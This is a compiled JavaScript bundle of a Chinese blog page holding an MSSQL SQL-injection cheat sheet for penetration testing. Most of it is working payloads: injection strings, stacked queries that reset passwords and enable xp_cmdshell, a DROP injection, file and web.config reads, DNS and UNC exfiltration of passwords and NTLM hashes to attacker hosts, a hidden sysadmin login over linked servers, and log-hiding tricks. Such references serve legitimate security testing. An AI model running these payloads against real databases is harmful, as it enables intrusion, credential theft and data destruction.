"use strict";(globalThis.webpackChunkblog=globalThis.webpackChunkblog||[]).push([[4877],{7441:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>c,contentTitle:()=>a,default:()=>h,frontMatter:()=>t,metadata:()=>l,toc:()=>d});const l=JSON.parse('{"id":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MSSQL","title":"MSSQL","description":"|\u4f5c\u8005|\u4fee\u8ba2\u65f6\u95f4|","source":"@site/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/07.MSSQL.md","sourceDirName":"\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165","slug":"/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MSSQL","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MSSQL","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/07.MSSQL.md","tags":[],"version":"current","sidebarPosition":7,"frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"SQLite","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/SQLite"},"next":{"title":"HQL","permalink":"/en/docs/\u4e2a\u4eba\u77e5\u8bc6\u5e93/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/HQL"}}');var r=n(4848),i=n(8453);const t={},a=void 0,c={},d=[{value:"MSSQL \u9ed8\u8ba4\u6570\u636e\u5e93",id:"mssql-\u9ed8\u8ba4\u6570\u636e\u5e93",level:2},{value:"MSSQL \u6ce8\u91ca",id:"mssql-\u6ce8\u91ca",level:2},{value:"MSSQL \u7528\u6237",id:"mssql-\u7528\u6237",level:2},{value:"MSSQL Version",id:"mssql-version",level:2},{value:"MSSQL \u4e3b\u673a\u540d",id:"mssql-\u4e3b\u673a\u540d",level:2},{value:"MSSQL \u6570\u636e\u5e93\u540d\u79f0",id:"mssql-\u6570\u636e\u5e93\u540d\u79f0",level:2},{value:"MSSQL \u6570\u636e\u5e93\u51ed\u636e",id:"mssql-\u6570\u636e\u5e93\u51ed\u636e",level:2},{value:"MSSQL \u5217\u8868\u6570\u636e\u5e93",id:"mssql-\u5217\u8868\u6570\u636e\u5e93",level:2},{value:"MSSQL \u5217\u8868\u5217",id:"mssql-\u5217\u8868\u5217",level:2},{value:"MSSQL \u5217\u8868\u8868",id:"mssql-\u5217\u8868\u8868",level:2},{value:"\u57fa\u4e8e MSSQL \u8054\u5408",id:"\u57fa\u4e8e-mssql-\u8054\u5408",level:2},{value:"MSSQL \u57fa\u4e8e\u9519\u8bef",id:"mssql-\u57fa\u4e8e\u9519\u8bef",level:2},{value:"MSSQL \u57fa\u4e8e\u76f2\u7684",id:"mssql-\u57fa\u4e8e\u76f2\u7684",level:2},{value:"MSSQL \u57fa\u4e8e\u65f6\u95f4",id:"mssql-\u57fa\u4e8e\u65f6\u95f4",level:2},{value:"MSSQL \u5806\u53e0\u67e5\u8be2",id:"mssql-\u5806\u53e0\u67e5\u8be2",level:2},{value:"MSSQL \u8bfb\u53d6\u6587\u4ef6",id:"mssql-\u8bfb\u53d6\u6587\u4ef6",level:2},{value:"MSSQL \u547d\u4ee4\u6267\u884c",id:"mssql-\u547d\u4ee4\u6267\u884c",level:2},{value:"MSSQL \u5e26\u5916",id:"mssql-\u5e26\u5916",level:2},{value:"MSSQL DNS \u5916\u8fc7\u6ee4",id:"mssql-dns-\u5916\u8fc7\u6ee4",level:3},{value:"MSSQL UNC \u8def\u5f84",id:"mssql-unc-\u8def\u5f84",level:3},{value:"MSSQL \u4f7f\u7528\u6237\u6210\u4e3a DBA\uff08\u6570\u636e\u5e93\u7ba1\u7406\u5458\uff09",id:"mssql-\u4f7f\u7528\u6237\u6210\u4e3a-dba\u6570\u636e\u5e93\u7ba1\u7406\u5458",level:2},{value:"MSSQL \u53d7\u4fe1\u4efb\u7684\u94fe\u63a5",id:"mssql-\u53d7\u4fe1\u4efb\u7684\u94fe\u63a5",level:2},{value:"\u5217\u51fa\u6743\u9650",id:"\u5217\u51fa\u6743\u9650",level:2},{value:"MSSQL \u64cd\u4f5c\u7cfb\u7edf",id:"mssql-\u64cd\u4f5c\u7cfb\u7edf",level:2},{value:"\u53c2\u8003\u6587\u732e",id:"\u53c2\u8003\u6587\u732e",level:2}];function o(e){const s={a:"a",blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,i.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsxs)(s.table,{children:[(0,r.jsx)(s.thead,{children:(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.th,{style:{textAlign:"left"},children:"\u4f5c\u8005"}),(0,r.jsx)(s.th,{style:{textAlign:"left"},children:"\u4fee\u8ba2\u65f6\u95f4"})]})}),(0,r.jsx)(s.tbody,{children:(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{style:{textAlign:"left"},children:(0,r.jsx)(s.img,{src:"https://img.shields.io/badge/wjlin0-blog-green",alt:"wjlin0"})}),(0,r.jsx)(s.td,{style:{textAlign:"left"},children:"2023-07-05 21:37:29"})]})})]}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u9ed8\u8ba4\u6570\u636e\u5e93",children:"MSSQL \u9ed8\u8ba4\u6570\u636e\u5e93"}),"\n",(0,r.jsxs)(s.table,{children:[(0,r.jsx)(s.thead,{children:(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.th,{children:"Name"}),(0,r.jsx)(s.th,{children:"\u63cf\u8ff0"})]})}),(0,r.jsxs)(s.tbody,{children:[(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"pubs"}),(0,r.jsx)(s.td,{children:"MSSQL 2005 \u4e0a\u4e0d\u53ef\u7528"})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"model"}),(0,r.jsx)(s.td,{children:"\u63d0\u4f9b\u6240\u6709\u7248\u672c"})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"msdb"}),(0,r.jsx)(s.td,{children:"\u63d0\u4f9b\u6240\u6709\u7248\u672c"})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"tempdb"}),(0,r.jsx)(s.td,{children:"\u63d0\u4f9b\u6240\u6709\u7248\u672c"})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"northwind"}),(0,r.jsx)(s.td,{children:"\u63d0\u4f9b\u6240\u6709\u7248\u672c"})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:"information_schema"}),(0,r.jsx)(s.td,{children:"MSSQL 2000 \u53ca\u66f4\u9ad8\u7248\u672c\u4e2d\u7684 Availalble"})]})]})]}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u6ce8\u91ca",children:"MSSQL \u6ce8\u91ca"}),"\n",(0,r.jsxs)(s.table,{children:[(0,r.jsx)(s.thead,{children:(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.th,{children:"Type"}),(0,r.jsx)(s.th,{children:"\u63cf\u8ff0"})]})}),(0,r.jsxs)(s.tbody,{children:[(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:(0,r.jsx)(s.code,{children:"/* MSSQL Comment */"})}),(0,r.jsx)(s.td,{children:"C \u6837\u5f0f\u6ce8\u91ca"})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:(0,r.jsx)(s.code,{children:"-- -"})}),(0,r.jsx)(s.td,{children:"SQL \u6ce8\u91ca"})]}),(0,r.jsxs)(s.tr,{children:[(0,r.jsx)(s.td,{children:(0,r.jsx)(s.code,{children:";%00"})}),(0,r.jsx)(s.td,{children:"\u7a7a\u5b57\u8282"})]})]})]}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u7528\u6237",children:"MSSQL \u7528\u6237"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"SELECT CURRENT_USER\nSELECT user_name();\nSELECT system_user;\nSELECT user;\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-version",children:"MSSQL Version"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"SELECT @@version\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u4e3b\u673a\u540d",children:"MSSQL \u4e3b\u673a\u540d"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"SELECT HOST_NAME()\nSELECT @@hostname\nSELECT @@SERVERNAME\nSELECT SERVERPROPERTY('productversion')\nSELECT SERVERPROPERTY('productlevel')\nSELECT SERVERPROPERTY('edition');\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u6570\u636e\u5e93\u540d\u79f0",children:"MSSQL \u6570\u636e\u5e93\u540d\u79f0"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"SELECT DB_NAME()\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u6570\u636e\u5e93\u51ed\u636e",children:"MSSQL \u6570\u636e\u5e93\u51ed\u636e"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["\uff1a\u54c8\u5e0c\u732b\u6a21\u5f0f 131\uff1a ",(0,r.jsx)(s.code,{children:"0x01002702560500000000000000000000000000000000000000008db43dd9b1972a636ad0c7d4b8c515cb8ce46578"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"SELECT name, password FROM master..sysxlogins\nSELECT name, master.dbo.fn_varbintohexstr(password) FROM master..sysxlogins \n-- Need to convert to hex to return hashes in MSSQL error message / some version of query analyzer\n"})}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:["\uff1a\u54c8\u5e0c\u732b\u6a21\u5f0f 132\uff1a ",(0,r.jsx)(s.code,{children:"0x010018102152f8f28c8499d8ef263c53f8be369d799f931b2fbe"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"SELECT name, password_hash FROM master.sys.sql_logins\nSELECT name + '-' + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins\n"})}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u5217\u8868\u6570\u636e\u5e93",children:"MSSQL \u5217\u8868\u6570\u636e\u5e93"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"SELECT name FROM master..sysdatabases;\nSELECT DB_NAME(N); \u2014 for N = 0, 1, 2, \u2026\nSELECT STRING_AGG(name, ', ') FROM master..sysdatabases; -- Change delimeter value such as ', ' to anything else you want => master, tempdb, model, msdb   (Only works in MSSQL 2017+)\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u5217\u8868\u5217",children:"MSSQL \u5217\u8868\u5217"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = \u2018mytable\u2019); \u2014 for the current DB only\nSELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=\u2019sometable\u2019; \u2014 list colum names and types for master..sometable\n\nSELECT table_catalog, column_name FROM information_schema.columns\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u5217\u8868\u8868",children:"MSSQL \u5217\u8868\u8868"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"SELECT name FROM master..sysobjects WHERE xtype = \u2018U\u2019; \u2014 use xtype = \u2018V\u2019 for views\nSELECT name FROM someotherdb..sysobjects WHERE xtype = \u2018U\u2019;\nSELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM master..syscolumns, master..sysobjects WHERE master..syscolumns.id=master..sysobjects.id AND master..sysobjects.name=\u2019sometable\u2019; \u2014 list colum names and types for master..sometable\n\nSELECT table_catalog, table_name FROM information_schema.columns\nSELECT STRING_AGG(name, ', ') FROM master..sysobjects WHERE xtype = 'U'; -- Change delimeter value such as ', ' to anything else you want => trace_xe_action_map, trace_xe_event_map, spt_fallback_db, spt_fallback_dev, spt_fallback_usg, spt_monitor, MSreplication_options  (Only works in MSSQL 2017+)\n"})}),"\n",(0,r.jsx)(s.h2,{id:"\u57fa\u4e8e-mssql-\u8054\u5408",children:"\u57fa\u4e8e MSSQL \u8054\u5408"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- extract databases names\n$ SELECT name FROM master..sysdatabases\n[*] Injection\n[*] msdb\n[*] tempdb\n\n-- extract tables from Injection database\n$ SELECT name FROM Injection..sysobjects WHERE xtype = 'U'\n[*] Profiles\n[*] Roles\n[*] Users\n\n-- extract columns for the table Users\n$ SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'Users')\n[*] UserId\n[*] UserName\n\n-- Finally extract the data\n$ SELECT  UserId, UserName from Users\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u57fa\u4e8e\u9519\u8bef",children:"MSSQL \u57fa\u4e8e\u9519\u8bef"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"For integer inputs : convert(int,@@version)\nFor integer inputs : cast((SELECT @@version) as int)\n\nFor string inputs   : ' + convert(int,@@version) + '\nFor string inputs   : ' + cast((SELECT @@version) as int) + '\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u57fa\u4e8e\u76f2\u7684",children:"MSSQL \u57fa\u4e8e\u76f2\u7684"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -\n\nAND ASCII(SUBSTRING(SELECT TOP 1 username FROM tblusers),1,1)=97\nAND UNICODE(SUBSTRING((SELECT 'A'),1,1))>64-- \nAND SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables > 'A'\n\nAND ISNULL(ASCII(SUBSTRING(CAST((SELECT LOWER(db_name(0)))AS varchar(8000)),1,1)),0)>90\n\nSELECT @@version WHERE @@version LIKE '%12.0.2000.8%'\n\nWITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)\nSELECT message FROM data WHERE row = 1 and message like 't%'\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u57fa\u4e8e\u65f6\u95f4",children:"MSSQL \u57fa\u4e8e\u65f6\u95f4"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"ProductID=1;waitfor delay '0:0:10'--\nProductID=1);waitfor delay '0:0:10'--\nProductID=1';waitfor delay '0:0:10'--\nProductID=1');waitfor delay '0:0:10'--\nProductID=1));waitfor delay '0:0:10'--\n\nIF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'\nIF 1=1 WAITFOR DELAY '0:0:5' ELSE WAITFOR DELAY '0:0:0';\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u5806\u53e0\u67e5\u8be2",children:"MSSQL \u5806\u53e0\u67e5\u8be2"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsx)(s.p,{children:"\u6ca1\u6709\u4efb\u4f55\u8bed\u53e5\u7ec8\u6b62\u7b26"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- multiple SELECT statements\nSELECT 'A'SELECT 'B'SELECT 'C'\n\n-- updating password with a stacked query\nSELECT id, username, password FROM users WHERE username = 'admin'exec('update[users]set[password]=''a''')--\n\n-- using the stacked query to enable xp_cmdshell\n-- you won't have the output of the query, redirect it to a file \nSELECT id, username, password FROM users WHERE username = 'admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--\n"})}),"\n"]}),"\n",(0,r.jsxs)(s.li,{children:["\n",(0,r.jsx)(s.p,{children:"\u4f7f\u7528\u5206\u53f7\u201c\uff1b\u201d\u6dfb\u52a0\u53e6\u4e00\u4e2a\u67e5\u8be2"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"ProductID=1; DROP members--\n"})}),"\n"]}),"\n"]}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u8bfb\u53d6\u6587\u4ef6",children:"MSSQL \u8bfb\u53d6\u6587\u4ef6"}),"\n",(0,r.jsxs)(s.p,{children:[(0,r.jsx)(s.strong,{children:"\u6743\u9650"}),"\uff1a\u9009\u9879\u9700\u8981\u6216 ",(0,r.jsx)(s.code,{children:"ADMINISTER DATABASE BULK OPERATIONS"})," \u6743\u9650\u3002"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-1 union select null,(select x from OpenRowset(BULK 'C:\\Windows\\win.ini',SINGLE_CLOB) R(x)),null,null\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u547d\u4ee4\u6267\u884c",children:"MSSQL \u547d\u4ee4\u6267\u884c"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"EXEC xp_cmdshell \"net user\";\nEXEC master.dbo.xp_cmdshell 'cmd.exe dir c:';\nEXEC master.dbo.xp_cmdshell 'ping 127.0.0.1';\n"})}),"\n",(0,r.jsx)(s.p,{children:"\u5982\u679c\u9700\u8981\u91cd\u65b0\u6fc0\u6d3b xp_cmdshell\uff08\u5728 SQL Server 2005 \u4e2d\u9ed8\u8ba4\u4e3a\u7981\u7528\uff09"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"EXEC sp_configure 'show advanced options',1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1;\nRECONFIGURE;\n"})}),"\n",(0,r.jsx)(s.p,{children:"\u4e0e MSSQL \u5b9e\u4f8b\u4ea4\u4e92\u3002"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:"sqsh -S 192.168.1.X -U sa -P superPassword\npython mssqlclient.py WORKGROUP/Administrator:password@192.168.1X -port 46758\n"})}),"\n",(0,r.jsx)(s.p,{children:"\u6267\u884c Python \u811a\u672c"}),"\n",(0,r.jsxs)(s.blockquote,{children:["\n",(0,r.jsx)(s.p,{children:"\u7531\u4e0d\u540c\u4e8e\u4f7f\u7528 xp_cmdshell \u6267\u884c\u547d\u4ee4\u7684\u7528\u6237\u6267\u884c"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:"#Print the user being used (and execute commands)\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"getpass\").getuser())'\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__(\"os\").system(\"whoami\"))'\n#Open and read a file\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open(\"C:\\\\inetpub\\\\wwwroot\\\\web.config\", \"r\").read())'\n#Multiline\nEXECUTE sp_execute_external_script @language = N'Python', @script = N'\nimport sys\nprint(sys.version)\n'\nGO\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u5e26\u5916",children:"MSSQL \u5e26\u5916"}),"\n",(0,r.jsx)(s.h3,{id:"mssql-dns-\u5916\u8fc7\u6ee4",children:"MSSQL DNS \u5916\u8fc7\u6ee4"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.a,{href:"https://twitter.com/ptswarm/status/1313476695295512578/photo/1%E4%B8%AD%E7%9A%84%E6%8A%80%E6%9C%AF",children:"https://twitter.com/ptswarm/status/1313476695295512578/photo/1\u4e2d\u7684\u6280\u672f"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:"# Permissions: Requires VIEW SERVER STATE permission on the server.\n1 and exists(select * from fn_xe_file_target_read_file('C:\\*.xel','\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.xem',null,null))\n\n# Permissions: Requires the CONTROL SERVER permission.\n1 (select 1 where exists(select * from fn_get_audit_file('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\',default,default)))\n1 and exists(select * from fn_trace_gettable('\\\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\\1.trc',default))\n"})}),"\n",(0,r.jsx)(s.h3,{id:"mssql-unc-\u8def\u5f84",children:"MSSQL UNC \u8def\u5f84"}),"\n",(0,r.jsxs)(s.p,{children:["MSSQL \u652f\u6301\u5806\u53e0\u67e5\u8be2\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u6307\u5411 IP \u5730\u5740\u7684\u53d8\u91cf\uff0c\u7136\u540e\u4f7f\u7528 ",(0,r.jsx)(s.code,{children:"xp_dirtree"})," \u51fd\u6570\u5217\u51fa SMB \u5171\u4eab\u4e2d\u7684\u6587\u4ef6\u5e76\u83b7\u53d6 NTLMv2 \u54c8\u5e0c\u3002"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"1'; use master; exec xp_dirtree '\\\\10.10.15.XX\\SHARE';-- \n"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"xp_dirtree '\\\\attackerip\\file'\nxp_fileexist '\\\\attackerip\\file'\nBACKUP LOG [TESTING] TO DISK = '\\\\attackerip\\file'\nBACKUP DATABASE [TESTING] TO DISK = '\\\\attackeri\\file'\nRESTORE LOG [TESTING] FROM DISK = '\\\\attackerip\\file'\nRESTORE DATABASE [TESTING] FROM DISK = '\\\\attackerip\\file'\nRESTORE HEADERONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE FILELISTONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE LABELONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE REWINDONLY FROM DISK = '\\\\attackerip\\file'\nRESTORE VERIFYONLY FROM DISK = '\\\\attackerip\\file'\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u4f7f\u7528\u6237\u6210\u4e3a-dba\u6570\u636e\u5e93\u7ba1\u7406\u5458",children:"MSSQL \u4f7f\u7528\u6237\u6210\u4e3a DBA\uff08\u6570\u636e\u5e93\u7ba1\u7406\u5458\uff09"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u53d7\u4fe1\u4efb\u7684\u94fe\u63a5",children:"MSSQL \u53d7\u4fe1\u4efb\u7684\u94fe\u63a5"}),"\n",(0,r.jsxs)(s.blockquote,{children:["\n",(0,r.jsx)(s.p,{children:"\u6570\u636e\u5e93\u4e4b\u95f4\u7684\u94fe\u63a5\u751a\u81f3\u53ef\u4ee5\u8de8\u6797\u4fe1\u4efb\u8fdb\u884c\u5de5\u4f5c\u3002"}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-powershell",children:"msf> use exploit/windows/mssql/mssql_linkcrawler\n[msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter sessio\n"})}),"\n",(0,r.jsx)(s.p,{children:"\u4eba\u5de5\u5f00\u91c7"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- find link\nselect * from master..sysservers\n\n-- execute query through the link\nselect * from openquery(\"dcorp-sql1\", 'select * from master..sysservers')\nselect version from openquery(\"linkedserver\", 'select @@version as version');\n\n-- chain multiple openquery\nselect version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")')\n\n-- execute shell commands\nEXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer\nselect 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"')\n\n-- create user and give admin privileges\nEXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\nEXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"\n"})}),"\n",(0,r.jsx)(s.h2,{id:"\u5217\u51fa\u6743\u9650",children:"\u5217\u51fa\u6743\u9650"}),"\n",(0,r.jsx)(s.p,{children:"\u5217\u51fa\u5f53\u524d\u7528\u6237\u5728\u670d\u52a1\u5668\u4e0a\u7684\u6709\u6548\u6743\u9650\u3002"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"SELECT * FROM fn_my_permissions(NULL, 'SERVER'); \n"})}),"\n",(0,r.jsx)(s.p,{children:"\u5217\u51fa\u5f53\u524d\u7528\u6237\u5bf9\u6570\u636e\u5e93\u7684\u6709\u6548\u6743\u9650\u3002"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"SELECT * FROM fn_my_permissions (NULL, 'DATABASE');\n"})}),"\n",(0,r.jsx)(s.p,{children:"\u5217\u51fa\u5f53\u524d\u7528\u6237\u5bf9\u89c6\u56fe\u7684\u6709\u6548\u6743\u9650\u3002"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{children:"SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; \n"})}),"\n",(0,r.jsx)(s.p,{children:"\u68c0\u67e5\u5f53\u524d\u7528\u6237\u662f\u5426\u662f\u6307\u5b9a\u670d\u52a1\u5668\u89d2\u8272\u7684\u6210\u5458\u3002"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin\nSELECT is_srvrolemember('sysadmin');\n"})}),"\n",(0,r.jsx)(s.h2,{id:"mssql-\u64cd\u4f5c\u7cfb\u7edf",children:"MSSQL \u64cd\u4f5c\u7cfb\u7edf"}),"\n",(0,r.jsxs)(s.p,{children:["\u5728\u67e5\u8be2\u4e2d\u4f7f\u7528 ",(0,r.jsx)(s.code,{children:"SP_PASSWORD"})," \u53ef\u4ee5\u9690\u85cf\u65e5\u5fd7\uff0c\u5982\uff1a"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-sql",children:"-- 'sp_password' was found in the text of this event.\n-- The text has been replaced with this comment for security reasons.\n"})}),"\n",(0,r.jsx)(s.h2,{id:"\u53c2\u8003\u6587\u732e",children:"\u53c2\u8003\u6587\u732e"}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.a,{href:"http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet",children:"Pentest Monkey-mssql sql \u6ce8\u5165\u5907\u5fd8\u5355"})}),"\n",(0,r.jsxs)(s.li,{children:["[\u57fa\u4e8e\u9519\u8bef-SQL \u6ce8\u5165](",(0,r.jsx)(s.a,{href:"https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20%E2%80%9COrder%20By%E2%80%9D%20clause%20(MSSQL).pdf%EF%BC%89",children:"https://github.com/incredibleindishell/exploit-code-by-me/blob/master/MSSQL%20Error-Based%20SQL%20Injection%20Order%20by%20clause/Error%20based%20SQL%20Injection%20in%20\u201cOrder%20By\u201d%20clause%20(MSSQL).pdf\uff09"})]}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.a,{href:"https://book.hacktricks.xyz/windows/active-directory-methodology/mssql-trusted-links",children:"MSSQL \u53ef\u4fe1\u94fe\u63a5-HackTricks.xyz"})}),"\n",(0,r.jsx)(s.li,{children:(0,r.jsx)(s.a,{href:"https://blog.netspi.com/how-to-hack-database-links-in-sql-server/",children:"SQL Server-\u94fe\u63a5\u2026\u94fe\u63a5\u2026\u94fe\u63a5\u548c\u5916\u58f3\uff1a\u5982\u4f55\u7834\u89e3 SQL Server \u4e2d\u7684\u6570\u636e\u5e93\u94fe\u63a5\uff01-Antti Rantasaari-2013 \u5e74 6 \u6708 6 